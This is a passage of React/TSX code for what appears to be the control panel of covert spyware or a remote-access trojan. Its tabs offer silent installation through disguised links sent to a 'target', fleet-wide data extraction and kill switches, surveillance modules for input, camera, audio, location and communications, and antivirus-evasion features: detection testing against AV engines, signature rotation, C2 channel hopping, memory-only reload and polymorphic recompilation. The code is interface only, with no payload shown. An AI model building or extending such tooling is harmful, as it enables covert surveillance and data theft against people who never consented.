                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold"
                  style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                  <RefreshCw size={11} className={enrollLoading ? "animate-spin" : ""} /> Regenerate
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
                {enrollData.links.map(link => {
                  const pm = PLAT_META[link.platform] ?? { icon:"🖥", color:"#6b8ab0", label: link.platform };
                  const previewLines = link.installCommand.split("\n").slice(0, 2).join("\n");
                  return (
                    <div key={link.platform} className="rounded-2xl p-4 space-y-3"
                      style={{ background:"#0a1628", border:`1px solid ${pm.color}35` }}>
                      {/* Header */}
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-xl">{pm.icon}</span>
                          <div>
                            <div className="font-bold text-sm" style={{ color:pm.color }}>{pm.label}</div>
                            <div className="text-[9px] font-mono" style={{ color:"#4a6080" }}>Key: {link.enrollKey}</div>
                          </div>
                        </div>
                        <div className="text-[9px] font-mono px-1.5 py-0.5 rounded"
                          style={{ background:`${pm.color}15`, color:pm.color, border:`1px solid ${pm.color}30` }}>
                          {link.linkId}
                        </div>
                      </div>

                      {/* Enroll URL */}
                      <div className="space-y-1">
                        <div className="text-[9px] font-mono uppercase tracking-widest" style={{ color:"#4a6080" }}>Enroll URL</div>
                        <div className="flex items-center gap-2 rounded-lg px-2.5 py-1.5"
                          style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.18)" }}>
                          <span className="text-[10px] font-mono truncate flex-1" style={{ color:"#10d9a0" }}>
                            {link.enrollUrl}
                          </span>
                          <button title="Copy URL"
                            onClick={() => { navigator.clipboard.writeText(link.enrollUrl); show(`${pm.label} URL copied`, "success"); }}>
                            <Copy size={11} color="#6b8ab0" className="hover:text-white transition-colors" />
                          </button>
                          <a href={link.enrollUrl} target="_blank" rel="noreferrer" title="Open URL">
                            <ExternalLink size={11} color="#3b82f6" />
                          </a>
                        </div>
                      </div>

                      {/* Install command preview */}
                      <div className="space-y-1">
                        <div className="text-[9px] font-mono uppercase tracking-widest" style={{ color:"#4a6080" }}>Install Command</div>
                        <div className="rounded-lg px-2.5 py-2" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                          <pre className="text-[9px] font-mono break-all whitespace-pre-wrap leading-relaxed" style={{ color:"#b8cce8" }}>
                            {previewLines}{link.installCommand.split("\n").length > 2 ? "\n…" : ""}
                          </pre>
                          <button className="mt-1 text-[9px] font-mono flex items-center gap-1" style={{ color:"#3b82f6" }}
                            onClick={() => { navigator.clipboard.writeText(link.installCommand); show(`${pm.label} command copied`, "success"); }}>
                            <Copy size={9} /> Copy full command
                          </button>
                        </div>
                      </div>

                      {/* Download button */}
                      <a href={link.downloadUrl} download target="_blank" rel="noreferrer"
                        className="flex items-center justify-center gap-2 py-2 rounded-xl font-bold text-xs transition-all hover:opacity-90 no-underline"
                        style={{ background:`${pm.color}18`, border:`1px solid ${pm.color}40`, color:pm.color }}>
                        <Download size={12} />
                        Download for {pm.label}
                      </a>
                    </div>
                  );
                })}
              </div>
            </div>
          )}
        </div>
      )}

      {/* DEPLOY TAB */}
      {tab === "deploy" && (
        <div className="space-y-5">
          <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>Deployment Methods</div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {[
                { title:"Silent Link", desc:"Disguised URL sent via any channel. Target visits link, agent installs silently.", icon:"🔗", color:"#3b82f6" },
                { title:"QR Enrollment", desc:"Scan QR code on target device. No typing required. Works on mobile.", icon:"📷", color:"#10d9a0" },
                { title:"Direct Install", desc:"Manual install via USB, ADB, or MDM push for managed fleets.", icon:"💾", color:"#10b981" },
              ].map(m => (
                <div key={m.title} className="rounded-xl p-4 flex flex-col gap-3"
                  style={{ background:"#030b16", border:`1px solid ${m.color}30` }}>
                  <div className="text-2xl">{m.icon}</div>
                  <div className="font-bold text-sm" style={{ color:m.color }}>{m.title}</div>
                  <div className="text-xs leading-relaxed" style={{ color:"#6b8ab0" }}>{m.desc}</div>
                </div>
              ))}
            </div>
          </div>
          <DeployLinkPanel show={show} />
        </div>
      )}

      {/* FLEET TAB */}
      {tab === "fleet" && (
        <div className="space-y-4">
          <div className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>
                Active Agent Fleet — {fleetLoading ? "loading…" : `${FLEET.length} node${FLEET.length !== 1 ? "s" : ""}`}
              </div>
              <div className="flex gap-2">
                <button onClick={() => show("OTA update pushed to all active agents", "success")}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
                  style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.3)" }}>
                  <RefreshCw size={11} /> OTA Update All
                </button>
                <button onClick={() => show("Data extraction initiated on all agents", "info")}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
                  style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                  <Upload size={11} /> Extract All Data
                </button>
              </div>
            </div>
            <div className="divide-y divide-purple-500/10">
              {fleetLoading && (
                <div className="px-5 py-8 text-center text-sm font-mono" style={{ color:"#6b8ab0" }}>
                  <RefreshCw size={14} className="animate-spin inline mr-2"/>Loading live fleet data…
                </div>
              )}
              {!fleetLoading && FLEET.length === 0 && (
                <div className="px-5 py-10 text-center" style={{ color:"#6b8ab0" }}>
                  <Signal size={24} className="mx-auto mb-3 opacity-30"/>
                  <div className="text-sm font-mono">No agents connected</div>
                  <div className="text-[10px] mt-1">Enroll a device using a deployment link or QR code</div>
                </div>
              )}
              {FLEET.map(agent => (
                <div key={agent.id} className="px-5 py-3 flex flex-wrap items-center gap-4">
                  <div className="flex items-center gap-3 flex-1 min-w-48">
                    <div className="w-8 h-8 rounded-lg flex items-center justify-center text-base flex-shrink-0"
                      style={{ background:`${OS_COLOR[agent.os]}18`, border:`1px solid ${OS_COLOR[agent.os]}30` }}>
                      {OS_ICON[agent.os]}
                    </div>
                    <div>
                      <div className="text-sm font-bold" style={{ color:"#e2eaf6" }}>{agent.device}</div>
                      <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{agent.ip} · v{agent.version}</div>
                    </div>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <div className="w-1.5 h-1.5 rounded-full animate-pulse"
                      style={{ background: agent.status==="active"?"#10b981":agent.status==="warning"?"#f59e0b":"#ef4444" }} />
                    <span className="text-[10px] font-mono uppercase" style={{ color: agent.status==="active"?"#10b981":agent.status==="warning"?"#f59e0b":"#ef4444" }}>
                      {agent.status}
                    </span>
                  </div>
                  <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>Last ping: {agent.lastPing}</div>
                  <div className="text-[10px] font-mono" style={{ color:"#10d9a0" }}>Queue: {agent.dataQueue}</div>
                  <div className="text-[10px] font-mono" style={{ color:"#3b82f6" }}>Mutations: {agent.mutations}</div>
                  <div className="flex gap-1.5 ml-auto">
                    <button onClick={() => show(`Data extracted from ${agent.device}`, "success")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(6,182,212,0.12)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.25)" }}>
                      Extract
                    </button>
                    <button onClick={() => show(`Update pushed to ${agent.device}`, "info")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(59,130,246,0.12)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.25)" }}>
                      Update
                    </button>
                    <button onClick={() => show(`Kill switch activated on ${agent.device}`, "error")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.25)" }}>
                      Kill
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* CAPABILITIES TAB */}
      {tab === "capabilities" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between mb-2">
            <div className="text-xs font-mono" style={{ color:"#6b8ab0" }}>
              {Object.values(modules).filter(Boolean).length} of {MODULE_DEFS.length} modules active
            </div>
            <div className="flex gap-2">
              <button onClick={() => setModules(Object.fromEntries(MODULE_DEFS.map(m => [m.key, true])))}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                Enable All
              </button>
              <button onClick={() => setModules(Object.fromEntries(MODULE_DEFS.map(m => [m.key, false])))}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.25)" }}>
                Disable All
              </button>
              <button onClick={() => show("Capability update pushed to all active agents", "success")}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"linear-gradient(135deg,#3b82f6,#10d9a0)", color:"#fff" }}>
                Push to Fleet
              </button>
            </div>
          </div>
          {(["Input","Visual","Audio","Location","Network","System","Comms","AI"] as const).map(cat => {
            const catMods = MODULE_DEFS.filter(m => m.category === cat);
            return (
              <div key={cat} className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="px-5 py-2.5 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
                  <span className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>{cat} Modules</span>
                </div>
                <div className="divide-y divide-purple-500/10">
                  {catMods.map(mod => (
                    <div key={mod.key} className="px-5 py-3 flex items-center gap-4">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className="text-sm font-bold" style={{ color:"#e2eaf6" }}>{mod.label}</span>
                          <span className="px-1.5 py-0.5 rounded text-[9px] font-bold uppercase"
                            style={{ background:`${RISK_COLOR[mod.risk]}15`, color:RISK_COLOR[mod.risk], border:`1px solid ${RISK_COLOR[mod.risk]}30` }}>
                            {mod.risk}
                          </span>
                        </div>
                        <div className="text-xs" style={{ color:"#6b8ab0" }}>{mod.desc}</div>
                      </div>
                      <button onClick={() => setModules(prev => ({ ...prev, [mod.key]: !prev[mod.key] }))}
                        className="relative w-10 h-5 rounded-full transition-all flex-shrink-0"
                        style={{ background: modules[mod.key] ? "#3b82f6" : "#0f1e3a" }}>
                        <span className="absolute top-0.5 transition-all duration-200 w-4 h-4 rounded-full bg-white shadow"
                          style={{ left: modules[mod.key] ? "calc(100% - 1.1rem)" : "0.125rem" }} />
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* AI MUTATIONS TAB */}
      {tab === "mutations" && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
          <div className="space-y-5">
            <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>AV Detection Scan</div>
              <button onClick={handleAVScan} disabled={avScanning}
                className="w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm mb-4 transition-all disabled:opacity-60"
                style={{ background:"linear-gradient(135deg,#3b82f6,#10d9a0)", color:"#fff" }}>
                {avScanning ? <><RefreshCw size={14} className="animate-spin" /> Scanning engines...</> : <><Shield size={14} /> Run AV Detection Test</>}
              </button>
              {avScanning && (
                <div className="space-y-2">
                  <div className="text-xs font-mono text-center mb-2" style={{ color:"#3b82f6" }}>Testing against 12 AV engines...</div>
                  <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(59,130,246,0.2)" }}>
                    <div className="h-full rounded-full animate-pulse" style={{ width:"70%", background:"linear-gradient(90deg,#3b82f6,#10d9a0)" }} />
                  </div>
                </div>
              )}
              {avScanResult && !avScanning && (
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-sm font-bold" style={{ color:"#e2eaf6" }}>Results</span>
                    <span className="text-sm font-bold" style={{ color: avScanResult.filter(r => r.detected).length === 0 ? "#10b981" : "#f59e0b" }}>
                      {avScanResult.filter(r => r.detected).length}/{avScanResult.length} detected
                    </span>
                  </div>
                  {avScanResult.map(r => (
                    <div key={r.engine} className="flex items-center justify-between px-3 py-1.5 rounded-lg"
                      style={{ background:"#030b16", border:`1px solid ${r.detected ? "rgba(239,68,68,0.3)" : "rgba(16,185,129,0.15)"}` }}>
                      <span className="text-xs font-mono" style={{ color:"#b8cce8" }}>{r.engine}</span>
                      <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded"
                        style={{ background: r.detected ? "rgba(239,68,68,0.15)" : "rgba(16,185,129,0.15)", color: r.detected ? "#ef4444" : "#10b981" }}>
                        {r.detected ? "DETECTED" : "CLEAN"}
                      </span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>Global Mutation Push</div>
              <div className="space-y-2 mb-4">
                {[
                  { label:"Signature Rotation",    desc:"Randomise all binary hash signatures" },
                  { label:"Process Rename",         desc:"Change process name across fleet" },
                  { label:"C2 Channel Hop",         desc:"Switch to backup C2 endpoint" },
                  { label:"Memory-Only Reload",     desc:"Reload agent without disk write" },
                  { label:"Polymorphic Recompile",  desc:"Full binary regeneration w/ new keys" },
                ].map(opt => (
                  <div key={opt.label} className="flex items-start gap-3 px-3 py-2 rounded-lg"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                    <Check size={12} color="#3b82f6" className="mt-0.5 flex-shrink-0" />
                    <div>
                      <div className="text-xs font-bold" style={{ color:"#e2eaf6" }}>{opt.label}</div>
                      <div className="text-[10px]" style={{ color:"#6b8ab0" }}>{opt.desc}</div>
                    </div>
                  </div>
                ))}
              </div>
              {mutating && (
                <div className="mb-3">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-xs font-mono" style={{ color:"#3b82f6" }}>Pushing mutation...</span>
                    <span className="text-xs font-mono" style={{ color:"#3b82f6" }}>{mutProgress}%</span>
                  </div>
                  <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(59,130,246,0.2)" }}>
                    <div className="h-full rounded-full transition-all duration-100" style={{ width:`${mutProgress}%`, background:"linear-gradient(90deg,#3b82f6,#10d9a0)" }} />
                  </div>
                </div>
              )}
              <button onClick={handleMutate} disabled={mutating}
                className="w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm transition-all disabled:opacity-60"
                style={{ background: mutating ? "rgba(59,130,246,0.3)" : "linear-gradient(135deg,#2563eb,#3b82f6)", color:"#fff" }}>
                {mutating ? <><RefreshCw size={14} className="animate-spin" /> Mutating fleet...</> : <><Zap size={14} /> Execute Global Mutation</>}
              </button>
            </div>
          </div>

          <div className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
              <span className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Mutation Log</span>
            </div>
            <div className="divide-y divide-purple-500/10 overflow-y-auto max-h-[600px]">
              {mutLog.length === 0 && (
                <div className="px-5 py-10 text-center" style={{ color:"#6b8ab0" }}>
                  <div className="text-sm font-mono">No mutations yet</div>
                  <div className="text-[10px] mt-1">Execute a global mutation to see the log here</div>
                </div>
              )}
              {mutLog.map((entry, i) => (
                <div key={i} className="px-5 py-3">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{entry.ts}</span>
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded"
                      style={{ background:"rgba(16,185,129,0.12)", color:"#10b981" }}>{entry.result}</span>
                  </div>
                  <div className="text-xs font-semibold mb-0.5" style={{ color:"#e2eaf6" }}>{entry.event}</div>
                  <div className="text-[10px]" style={{ color:"#6b8ab0" }}>Target: {entry.target}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

